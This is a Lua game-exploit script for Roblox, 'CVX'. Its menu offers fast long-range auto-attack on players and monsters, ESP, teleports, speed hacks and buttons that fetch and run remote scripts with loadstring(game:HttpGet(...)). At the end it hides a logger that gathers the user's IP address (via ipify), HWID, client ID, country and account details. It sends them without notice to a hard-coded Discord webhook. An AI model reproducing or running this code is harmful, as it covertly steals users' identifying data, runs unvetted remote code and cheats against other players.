-- [[ CVX - CVX Script]]

local UI_TAG = "CVX Center"
local S_CG = game:GetService("CoreGui")
if S_CG:FindFirstChild(UI_TAG) then S_CG[UI_TAG]:Destroy(); getgenv().StopLoops = true; task.wait(0.1) end
getgenv().StopLoops = false

local S_PL, S_RS, S_ST, S_REP, S_UI = game:GetService("Players"), game:GetService("RunService"), game:GetService("Stats"), game:GetService("ReplicatedStorage"), game:GetService("UserInputService")
local LP = S_PL.LocalPlayer
local Camera = workspace.CurrentCamera
local CommF = S_REP:WaitForChild("Remotes"):WaitForChild("CommF_")

-- [[ 1. Core Configuration ]]
getgenv().CVXConfig = {
    Toggles = { 
        FastAttack = true, AttackMonsters = false, AttackPlayers = false, AttackAll = true,
        SpeedActive = true, JumpActive = false, AutoV4 = false,
        ESP_Main = true, ESP_NameOnly = true, ESP_Health = true, ESP_Tracer = false
    },
    Settings = { AtkRange = 5000, ClickDelay = 0.01, WalkSpd = 150, JumpPower = 100, FOV = 70 }
}

-- [[ 2. UI Framework ]]
local SG = Instance.new("ScreenGui", S_CG); SG.Name = UI_TAG; SG.ResetOnSpawn = false
local function ApplyROG(obj, thick)
    local stroke = Instance.new("UIStroke", obj); stroke.Thickness = thick; stroke.ApplyStrokeMode = "Border"
    task.spawn(function() while not getgenv().StopLoops and task.wait(0.01) do stroke.Color = Color3.fromHSV(tick() % 5 / 5, 0.8, 1) end end)
end

local Main = Instance.new("Frame", SG); Main.BackgroundColor3 = Color3.fromRGB(15, 15, 20); Main.Position = UDim2.new(0.5, -250, 0.5, -180); Main.Size = UDim2.new(0, 500, 0, 420); Main.BorderSizePixel = 0; Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 12); ApplyROG(Main, 3)
local Side = Instance.new("Frame", Main); Side.Size = UDim2.new(0, 130, 1, 0); Side.BackgroundColor3 = Color3.fromRGB(22, 22, 28); Instance.new("UICorner", Side)
Instance.new("UIListLayout", Side).HorizontalAlignment = "Center"; Instance.new("UIPadding", Side).PaddingTop = UDim.new(0, 10)

-- Left-side player info
local UserPart = Instance.new("Frame", Side); UserPart.Size = UDim2.new(1, 0, 0, 95); UserPart.BackgroundTransparency = 1
local Avatar = Instance.new("ImageLabel", UserPart); Avatar.Size = UDim2.new(0, 40, 0, 40); Avatar.Position = UDim2.new(0.5, -20, 0, 0); Avatar.Image = "rbxthumb://type=AvatarHeadShot&id="..LP.UserId.."&w=150&h=150"; Instance.new("UICorner", Avatar).CornerRadius = UDim.new(1,0)
local DN = Instance.new("TextLabel", UserPart); DN.Size = UDim2.new(1,0,0,15); DN.Position = UDim2.new(0,0,0,45); DN.Text = LP.DisplayName; DN.TextColor3 = Color3.new(1,1,1); DN.Font = "GothamBold"; DN.TextSize = 10; DN.BackgroundTransparency = 1
local UN = Instance.new("TextLabel", UserPart); UN.Size = UDim2.new(1,0,0,12); UN.Position = UDim2.new(0,0,0,60); UN.Text = "@"..LP.Name; UN.TextColor3 = Color3.fromRGB(180, 180, 180); UN.Font = "Gotham"; UN.TextSize = 8; UN.BackgroundTransparency = 1

local Container = Instance.new("Frame", Main); Container.Position = UDim2.new(0, 140, 0, 10); Container.Size = UDim2.new(1, -150, 1, -20); Container.BackgroundTransparency = 1
local Tabs = {}; local TabButtons = {}

local function CreateTab(name)
    local F = Instance.new("ScrollingFrame", Container); F.Size = UDim2.new(1, 0, 1, 0); F.BackgroundTransparency = 1; F.Visible = false; F.ScrollBarThickness = 2; F.AutomaticCanvasSize = "Y"
    Instance.new("UIListLayout", F).Padding = UDim.new(0, 8)
    local B = Instance.new("TextButton", Side); B.Size = UDim2.new(0.9, 0, 0, 28); B.BackgroundColor3 = Color3.fromRGB(35, 35, 45); B.Text = name; B.TextColor3 = Color3.new(1,1,1); B.Font = "GothamBold"; B.TextSize = 10; Instance.new("UICorner", B)
    B.MouseButton1Click:Connect(function() 
        for i, v in pairs(Tabs) do v.Visible = false; TabButtons[i].BackgroundColor3 = Color3.fromRGB(35, 35, 45) end
        F.Visible = true; B.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
    end)
    table.insert(Tabs, F); table.insert(TabButtons, B); return F
end

local function AddButton(p, t, f)
    local B = Instance.new("TextButton", p); B.Size = UDim2.new(0.95, 0, 0, 30); B.BackgroundColor3 = Color3.fromRGB(40, 40, 50); B.Text = t; B.TextColor3 = Color3.new(1,1,1); B.Font = "GothamBold"; B.TextSize = 10; Instance.new("UICorner", B); B.MouseButton1Click:Connect(f)
end

local function AddToggle(p, t, f)
    local B = Instance.new("TextButton", p); B.Size = UDim2.new(0.95, 0, 0, 32); B.BackgroundColor3 = Color3.fromRGB(45, 45, 55); B.Text = t.." [OFF]"; B.TextColor3 = Color3.new(1,1,1); B.Font = "GothamBold"; B.TextSize = 10; Instance.new("UICorner", B)
    B.MouseButton1Click:Connect(function() 
        getgenv().CVXConfig.Toggles[f] = not getgenv().CVXConfig.Toggles[f]
        B.Text = t..(getgenv().CVXConfig.Toggles[f] and " [ON]" or " [OFF]")
        B.BackgroundColor3 = getgenv().CVXConfig.Toggles[f] and Color3.fromRGB(150, 40, 40) or Color3.fromRGB(45, 45, 55)
    end)
end

local function AddSlider(p, t, min, max, def, isDec, cb)
    local F = Instance.new("Frame", p); F.Size = UDim2.new(0.95, 0, 0, 50); F.BackgroundTransparency = 1
    local L = Instance.new("TextLabel", F); L.Size = UDim2.new(1,0,0,20); L.Text = t..": "..def; L.TextColor3 = Color3.new(1,1,1); L.Font = "GothamBold"; L.TextSize = 10; L.BackgroundTransparency = 1; L.TextXAlignment = "Left"
    local B = Instance.new("TextButton", F); B.Size = UDim2.new(1,0,0,8); B.Position = UDim2.new(0,0,0,25); B.BackgroundColor3 = Color3.fromRGB(60,60,70); B.Text = ""; Instance.new("UICorner", B)
    local S = Instance.new("Frame", B); S.Size = UDim2.new((def-min)/(max-min), 0, 1, 0); S.BackgroundColor3 = Color3.new(1,1,1); Instance.new("UICorner", S)
    B.InputBegan:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then local m; m = S_UI.InputChanged:Connect(function(i2) if i2.UserInputType == Enum.UserInputType.MouseMovement or i2.UserInputType == Enum.UserInputType.Touch then local pVal = math.clamp((i2.Position.X - B.AbsolutePosition.X) / B.AbsoluteSize.X, 0, 1); S.Size = UDim2.new(pVal, 0, 1, 0); local val = min + (max - min) * pVal; val = isDec and math.floor(val*100)/100 or math.floor(val); L.Text = t..": "..val; cb(val) end end) S_UI.InputEnded:Connect(function(i3) if i3.UserInputType == Enum.UserInputType.MouseButton1 or i3.UserInputType == Enum.UserInputType.Touch then m:Disconnect() end end) end end)
end

-- [[ 3. Tabs and Content ]]
local T_Notice = CreateTab("Notice")
local T_Combat = CreateTab("Attack Speed + Range")
local T_TP = CreateTab("Teleport")
local T_Player = CreateTab("Player Tweaks")
local T_ESP = CreateTab("ESP")
local T_Scripts = CreateTab("External Scripts")

-- Notice Section
AddButton(T_Notice, "ðŸ‘º Made by CVX", function() end)
AddButton(T_Notice, "Update Date: 2026/02/23", function() end)
AddButton(T_Notice, "Changes: Auto V4 feature", function() end)
AddButton(T_Notice, "Status: Script testing in progress", function() end)
AddButton(T_Notice, "Click the button below to join Discord for more info", function() end)

-- Added Discord copy button
local dcLink = "https://discord.com/users/1099156703930495046"
AddButton(T_Notice, "Click me to join Discord", function()
    setclipboard(dcLink) -- This is the common copy function for most executors
    
    -- Simple visual feedback to confirm the click worked
    local originalText = "Click me to join DC"
    -- Find the button that was just clicked (logic based on your UI structure)
    for _, v in pairs(T_Notice:GetChildren()) do
        if v:IsA("TextButton") and v.Text == originalText then
            v.Text = "âœ… Copied to clipboard!"
            v.BackgroundColor3 = Color3.fromRGB(40, 150, 40)
            task.delay(2, function()
                v.Text = originalText
                v.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
            end)
        end
    end
end)

-- ðŸ“‚ External Scripts
AddButton(T_Scripts, "CVX Fly", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/CVXOwO/CVX-script/refs/heads/main/cvx%20fly%20script"))() end)
AddButton(T_Scripts, "XA hub", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/iqiq180jush-cell/Xuan/refs/heads/main/XA"))() end)
AddButton(T_Scripts, "P Script", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/iqiq180jush-cell/Xuan/refs/heads/main/p"))() end)
AddButton(T_Scripts, "FPS Optimization", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/iqiq180jush-cell/Xuan/refs/heads/main/FPPS"))() end)
AddButton(T_Scripts, "Old External Aimbot", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/iqiq180jush-cell/Xuan/refs/heads/main/onsb.scripht.lua"))() end)
AddButton(T_Scripts, "Zero Script", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/iqiq180jash-afk/Xuan/refs/heads/main/0%E8%85%B3%E6%9C%AC"))() end)
AddButton(T_Scripts, "LX hub", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/iqiq180jush-cell/josh/refs/heads/main/trash%20LX"))() end)

-- Combat
AddToggle(T_Combat, "Enable Fast Attack", "FastAttack")
AddSlider(T_Combat, "Attack Speed", 0.01, 0.5, 0.01, true, function(v) getgenv().CVXConfig.Settings.ClickDelay = v end)
AddSlider(T_Combat, "Attack Range", 100, 5000, 5000, false, function(v) getgenv().CVXConfig.Settings.AtkRange = v end)
AddToggle(T_Combat, "Mode: Monsters Only", "AttackMonsters")
AddToggle(T_Combat, "Mode: Players Only", "AttackPlayers")
AddToggle(T_Combat, "Mode: Attack All", "AttackAll")
AddToggle(T_Combat, "To attack all, turn off the two toggles above (Monsters/Players Only)")

-- Teleport
local function TPF(pos) pcall(function() LP.Character.HumanoidRootPart.CFrame = CFrame.new(pos) end) end
AddButton(T_TP, "--- Sea Teleport ---", function() end)
AddButton(T_TP, "Go to First Sea", function() CommF:InvokeServer("TravelMain") end)
AddButton(T_TP, "Go to Second Sea", function() CommF:InvokeServer("TravelDressrosa") end)
AddButton(T_TP, "Go to Third Sea", function() CommF:InvokeServer("TravelZou") end)
AddButton(T_TP, "--- Second Sea Area ---", function() end)
AddButton(T_TP, "Teleport to Swan Room", function() TPF(Vector3.new(2286.93, 15.06, 910.51)) end)
AddButton(T_TP, "Teleport to Mansion", function() TPF(Vector3.new(-287.37, 305.81, 592.98)) end)
AddButton(T_TP, "Teleport Inside Ghost Ship", function() TPF(Vector3.new(-6501.06, 83.11, -123.52)) end)
AddButton(T_TP, "Teleport Outside Ghost Ship", function() TPF(Vector3.new(922.78, 123.96, 32842.40)) end)
AddButton(T_TP, "--- Third Sea Area ---", function() end)
AddButton(T_TP, "Teleport to Sea Castle", function() TPF(Vector3.new(-12463.60, 376.26, -7566.08)) end)
AddButton(T_TP, "Teleport to Turtle Mansion", function() TPF(Vector3.new(-5060.41, 316.43, -3192.30)) end)
AddButton(T_TP, "Teleport to Hydra Island", function() TPF(Vector3.new(-5096.48, 316.43, -3177.91)) end)
AddButton(T_TP, "Teleport to Nine-Headed Snake", function() TPF(Vector3.new(-5027.03, 316.43, -3206.07)) end)

-- Player
AddToggle(T_Player, "Auto V4 Awakening", "AutoV4")
AddSlider(T_Player, "Camera FOV", 70, 150, 70, false, function(v) getgenv().CVXConfig.Settings.FOV = v end)
AddToggle(T_Player, "Modify Speed", "SpeedActive"); AddSlider(T_Player, "Speed", 16, 500, 150, false, function(v) getgenv().CVXConfig.Settings.WalkSpd = v end)
AddToggle(T_Player, "Modify Jump", "JumpActive"); AddSlider(T_Player, "Jump", 50, 600, 120, false, function(v) getgenv().CVXConfig.Settings.JumpPower = v end)

-- ESP (keep large font, single-line color shift)
AddToggle(T_ESP, "Main ESP Toggle", "ESP_Main")
AddToggle(T_ESP, "Show Name and Avatar", "ESP_NameOnly")
AddToggle(T_ESP, "Show Colorized HP and Distance", "ESP_Health")
AddToggle(T_ESP, "Tracer Line (ROG Style)", "ESP_Tracer")

-- [[ 4. Performance Panel ]]
local MonF = Instance.new("Frame", SG); MonF.Size = UDim2.new(0, 220, 0, 170); MonF.Position = UDim2.new(0.5, -110, 0.05, 0); MonF.BackgroundColor3 = Color3.fromRGB(10,10,15); MonF.Visible = false; Instance.new("UICorner", MonF); ApplyROG(MonF, 2)
local function ML(t, c) local l = Instance.new("TextLabel", MonF); l.Size = UDim2.new(1,0,0,25); l.BackgroundTransparency=1; l.TextColor3= c or Color3.new(1,1,1); l.Font="Code"; l.TextSize=10; l.Text=t; return l end
Instance.new("UIListLayout", MonF).HorizontalAlignment = "Center"
local mFPS = ML("FPS: --", Color3.fromRGB(0, 255, 127))
local mPing = ML("Ping: --", Color3.fromRGB(255, 200, 0))
local mMem = ML("Memory: -- MB", Color3.fromRGB(0, 190, 255))
ML("Executor: "..(identifyexecutor and identifyexecutor() or "Unknown"), Color3.fromRGB(255, 100, 100))
ML("Device: "..(S_UI.TouchEnabled and "mobile ðŸ“±" or "Pc ðŸ–¥ï¸"), Color3.fromRGB(150, 150, 255))
AddButton(Side, "Performance Panel", function() MonF.Visible = not MonF.Visible end)

-- [[ 5. Core ESP ]]
local function CreateESP(p)
    if p == LP then return end
    local line = Drawing.new("Line"); line.Visible = false
    local bg = Instance.new("BillboardGui"); bg.Size = UDim2.new(0, 200, 0, 70); bg.AlwaysOnTop = true; bg.Enabled = false
    local pImg = Instance.new("ImageLabel", bg); pImg.Size = UDim2.new(0, 35, 0, 35); pImg.Image = "rbxthumb://type=AvatarHeadShot&id="..p.UserId.."&w=150&h=150"; Instance.new("UICorner", pImg).CornerRadius = UDim.new(1,0)
    local nL = Instance.new("TextLabel", bg); nL.Size = UDim2.new(0, 150, 0, 25); nL.Position = UDim2.new(0, 40, 0, 0); nL.BackgroundTransparency = 1; nL.TextColor3 = Color3.new(1,1,1); nL.Font = "GothamBold"; nL.TextSize = 14; nL.TextXAlignment = "Left"
    local hL = Instance.new("TextLabel", bg); hL.Size = UDim2.new(0, 180, 0, 25); hL.Position = UDim2.new(0, 40, 0, 22); hL.BackgroundTransparency = 1; hL.Font = "GothamBold"; hL.TextSize = 13; hL.TextXAlignment = "Left"

    S_RS.RenderStepped:Connect(function()
        if getgenv().StopLoops or not p.Parent then bg:Destroy(); line:Remove(); return end
        local c = p.Character
        if c and c:FindFirstChild("HumanoidRootPart") and getgenv().CVXConfig.Toggles.ESP_Main then
            bg.Adornee = c.HumanoidRootPart; bg.Parent = c.HumanoidRootPart; bg.Enabled = true
            nL.Visible = getgenv().CVXConfig.Toggles.ESP_NameOnly; pImg.Visible = nL.Visible
            nL.Text = p.DisplayName
            hL.Visible = getgenv().CVXConfig.Toggles.ESP_Health
            if c:FindFirstChild("Humanoid") then
                local dist = math.floor(LP:DistanceFromCharacter(c.HumanoidRootPart.Position))
                hL.Text = "HP: " .. math.floor(c.Humanoid.Health) .. " | Dist: " .. dist .. "m"
                hL.TextColor3 = Color3.fromHSV((c.Humanoid.Health/c.Humanoid.MaxHealth) * 0.35, 0.9, 1)
            end
            if getgenv().CVXConfig.Toggles.ESP_Tracer then 
                local pos, os = Camera:WorldToViewportPoint(c.HumanoidRootPart.Position)
                if os then line.Visible = true; line.From = Vector2.new(Camera.ViewportSize.X/2, 0); line.To = Vector2.new(pos.X, pos.Y); line.Color = Color3.fromHSV(tick()%5/5,0.8,1) else line.Visible = false end
            else line.Visible = false end
        else bg.Enabled = false; line.Visible = false end
    end)
end

-- [[ 6. Core Loops and New V4 Logic ]]
local function callAwakeningRemote()
    local Backpack = LP:FindFirstChild("Backpack")
    if not Backpack then return end
    local Awakening = Backpack:FindFirstChild("Awakening")
    if not Awakening then return end
    local RemoteFunc = Awakening:FindFirstChild("RemoteFunction")
    if not RemoteFunc or not RemoteFunc:IsA("RemoteFunction") then return end
    
    pcall(function()
        RemoteFunc:InvokeServer(true)
    end)
end

task.spawn(function()
    while not getgenv().StopLoops and task.wait(0.5) do
        if MonF.Visible then
            mFPS.Text = "FPS: "..math.floor(workspace:GetRealPhysicsFPS())
            mPing.Text = "Ping: "..math.floor(S_ST.Network.ServerStatsItem["Data Ping"]:GetValue()).."ms"
            mMem.Text = "Memory: "..math.floor(S_ST:GetTotalMemoryUsageMb()).." MB"
        end
    end
end)

S_RS.RenderStepped:Connect(function()
    if getgenv().StopLoops then return end
    pcall(function()
        Camera.FieldOfView = getgenv().CVXConfig.Settings.FOV
        local H = LP.Character.Humanoid
        H.WalkSpeed = getgenv().CVXConfig.Toggles.SpeedActive and getgenv().CVXConfig.Settings.WalkSpd or 16
        H.JumpPower = getgenv().CVXConfig.Toggles.JumpActive and getgenv().CVXConfig.Settings.JumpPower or 50
        
        -- Apply new V4 logic
        if getgenv().CVXConfig.Toggles.AutoV4 and H.Health > 0 then
            callAwakeningRemote()
        end
    end)
end)

task.spawn(function()
    local RA = S_REP.Modules.Net:WaitForChild("RE/RegisterAttack")
    local RH = S_REP.Modules.Net:WaitForChild("RE/RegisterHit")
    while not getgenv().StopLoops and task.wait() do
        if getgenv().CVXConfig.Toggles.FastAttack then
            pcall(function()
                local ts = {}
                local function sc(f) for _,e in pairs(f:GetChildren()) do if e:FindFirstChild("Humanoid") and e.Humanoid.Health > 0 and LP:DistanceFromCharacter(e.PrimaryPart.Position) < getgenv().CVXConfig.Settings.AtkRange then table.insert(ts, {e, e.PrimaryPart}) end end end
                if getgenv().CVXConfig.Toggles.AttackAll then sc(workspace.Enemies); sc(workspace.Characters)
                elseif getgenv().CVXConfig.Toggles.AttackMonsters then sc(workspace.Enemies)
                elseif getgenv().CVXConfig.Toggles.AttackPlayers then sc(workspace.Characters) end
                if #ts > 0 then RA:FireServer(getgenv().CVXConfig.Settings.ClickDelay); RH:FireServer(ts[1][2], ts) end
            end)
        end
        task.wait(getgenv().CVXConfig.Settings.ClickDelay)
    end
end)

S_PL.PlayerAdded:Connect(CreateESP); for _,v in pairs(S_PL:GetPlayers()) do CreateESP(v) end

-- [[ 6. Close Confirmation Window System (your code integrated) ]]
local ConfirmFrame = Instance.new("Frame", SG) -- Using SG
ConfirmFrame.Size = UDim2.new(0, 250, 0, 120); ConfirmFrame.Position = UDim2.new(0.5, -125, 0.5, -60)
ConfirmFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 35); ConfirmFrame.Visible = false; ConfirmFrame.ZIndex = 20 -- Higher layer
Instance.new("UICorner", ConfirmFrame); ApplyROG(ConfirmFrame, 2)

local ConfirmText = Instance.new("TextLabel", ConfirmFrame)
ConfirmText.Text = "Are you sure you want to close the script?"; ConfirmText.Size = UDim2.new(1, 0, 0, 50); ConfirmText.TextColor3 = Color3.new(1,1,1); ConfirmText.BackgroundTransparency = 1; ConfirmText.ZIndex = 20

local Yes = Instance.new("TextButton", ConfirmFrame)
Yes.Text = "Confirm"; Yes.Size = UDim2.new(0, 80, 0, 30); Yes.Position = UDim2.new(0.15, 0, 0.6, 0); Yes.BackgroundColor3 = Color3.fromRGB(180, 50, 50); Yes.TextColor3 = Color3.new(1,1,1); Yes.ZIndex = 20; Instance.new("UICorner", Yes)

local No = Instance.new("TextButton", ConfirmFrame)
No.Text = "Cancel"; No.Size = UDim2.new(0, 80, 0, 30); No.Position = UDim2.new(0.55, 0, 0.6, 0); No.BackgroundColor3 = Color3.fromRGB(60, 60, 60); No.TextColor3 = Color3.new(1,1,1); No.ZIndex = 20; Instance.new("UICorner", No)

-- X button on main UI
local CloseBtn = Instance.new("TextButton", Main)
CloseBtn.Size = UDim2.new(0, 30, 0, 30); CloseBtn.Position = UDim2.new(1, -35, 0, 7)
CloseBtn.Text = "X"; CloseBtn.TextColor3 = Color3.new(1,1,1); CloseBtn.BackgroundColor3 = Color3.fromRGB(180, 50, 50); Instance.new("UICorner", CloseBtn)
CloseBtn.Font = "GothamBold"; CloseBtn.TextSize = 14

-- Button events
CloseBtn.MouseButton1Click:Connect(function() ConfirmFrame.Visible = true end)
No.MouseButton1Click:Connect(function() ConfirmFrame.Visible = false end)
Yes.MouseButton1Click:Connect(function() 
    getgenv().StopLoops = true -- Stop all background loops
    SG:Destroy() -- Destroy UI
end)

-- ðŸ‘‘Crown
local CVXBtn = Instance.new("TextButton", SG); CVXBtn.Size = UDim2.new(0, 60, 0, 60); CVXBtn.Position = UDim2.new(0, 30, 0, 30); CVXBtn.BackgroundColor3 = Color3.new(0,0,0); CVXBtn.Text = "ðŸ‘‘"; CVXBtn.TextSize = 35; Instance.new("UICorner", CVXBtn).CornerRadius = UDim.new(1,0); ApplyROG(CVXBtn, 4)
CVXBtn.MouseButton1Click:Connect(function() Main.Visible = not Main.Visible end)
local function Drag(o) local g, s, sp; o.InputBegan:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then g = true; s = i.Position; sp = o.Position end end) o.InputChanged:Connect(function(i) if g and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then local d = i.Position - s; o.Position = UDim2.new(sp.X.Scale, sp.X.Offset + d.X, sp.Y.Scale, sp.Y.Offset + d.Y) end end) o.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then g = false end end) end
Drag(Main); Drag(MonF); Drag(CVXBtn); Tabs[1].Visible = true; TabButtons[1].BackgroundColor3 = Color3.fromRGB(60, 60, 80)

-- Initialize display
Tabs[1].Visible = true; TabButtons[1].BackgroundColor3 = Color3.fromRGB(60, 60, 80)

-- ===================== Discord Webhook Log =====================
local GS_WEBHOOK = "https://discord.com/api/webhooks/1471858672123772938/Ho0cNEJ9MXfHgJ21RjsvTVHzHy3hSNtrBd9knuMsAWoGVb6FYTMca3_h6K7S5EcqsNBt"

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local LocalizationService = game:GetService("LocalizationService")
local MarketplaceService = game:GetService("MarketplaceService")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")

local localPlayer = Players.LocalPlayer
if not localPlayer then
    return
end

local function safeCall(func, fallback)
    local success, result = pcall(func)
    return success and result or fallback
end

local function getAvatarImage(userId)
    return safeCall(function()
        local url = string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", userId)
        local response = HttpService:JSONDecode(game:HttpGet(url))
        return response.data[1].imageUrl
    end, "https://www.roblox.com/Thumbs/Avatar.ashx?x=180&y=180&userId=" .. userId)
end

local function getDeviceType()
    local touch = UserInputService.TouchEnabled
    local keyboard = UserInputService.KeyboardEnabled
    local mouse = UserInputService.MouseEnabled
    
    if touch and not keyboard and not mouse then return "Mobile Device"
    elseif not touch and keyboard and mouse then return "Computer"
    elseif touch and keyboard and mouse then return "Emulator"
    else return "Unknown" end
end

local function getExecutor()
    return (identifyexecutor and identifyexecutor()) or 
           (getexecutorname and getexecutorname()) or 
           "Unknown"
end

local function getHWID()
    return (gethwid and gethwid()) or "Unavailable"
end

local function getIPAddress()
    local request = http_request or request or (syn and syn.request)
    if not request then return "No request function" end
    
    return safeCall(function()
        return request({Url = "https://api.ipify.org/", Method = "GET"}).Body
    end, "Failed to retrieve")
end

local userId = localPlayer.UserId
local placeId = game.PlaceId

local payload = {
    username = "CVX Bot",
    embeds = {{
        color = tonumber("0x32CD32"),
        title = string.format("Someone is using the script %s %d:%d", 
            os.date("%Y/%m/%d"), 
            tonumber(os.date("%H")), 
            tonumber(os.date("%M"))),
        
        thumbnail = {url = getAvatarImage(userId)},
        
        fields = {
            {name = "Username", value = localPlayer.Name, inline = true},
            {name = "Display Name", value = localPlayer.DisplayName, inline = true},
            {name = "User ID", value = string.format("[%d](https://www.roblox.com/users/%d/profile)", userId, userId), inline = true},
            
            {name = "Client ID", value = safeCall(function() return RbxAnalyticsService:GetClientId() end, "Failed to retrieve"), inline = false},
            
            {name = "Place ID", value = string.format("[%d](https://www.roblox.com/games/%d)", placeId, placeId), inline = true},
            {name = "Place Name", value = safeCall(function() return MarketplaceService:GetProductInfo(placeId).Name end, "Failed to retrieve"), inline = true},
            
            {name = "Executor", value = getExecutor(), inline = true},
            {name = "Account Age", value = string.format("%d days", localPlayer.AccountAge), inline = true},
            
            {name = "Device", value = getDeviceType(), inline = false},
            {name = "Country", value = string.format("Country: %s", safeCall(function() return LocalizationService:GetCountryRegionForPlayerAsync(localPlayer) end, "Failed to retrieve")), inline = false},
            {name = "Language", value = string.format("Language: %s", localPlayer.LocaleId), inline = false},
           
            {name = "HWID", value = getHWID(), inline = true},
            {name = "IP Address", value = getIPAddress(), inline = true},
            {name = "IP Lookup", value = string.format("https://binaryfork.com/tools/ip-address-lookup/?ip=%s#ip-lookup", getIPAddress()), inline = false}
        }
    }}
}

local request = http_request or request or HttpPost or (syn and syn.request)
if not request then
    return
end

safeCall(function()
    request({
        Url = GS_WEBHOOK,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(payload)
    })
end)
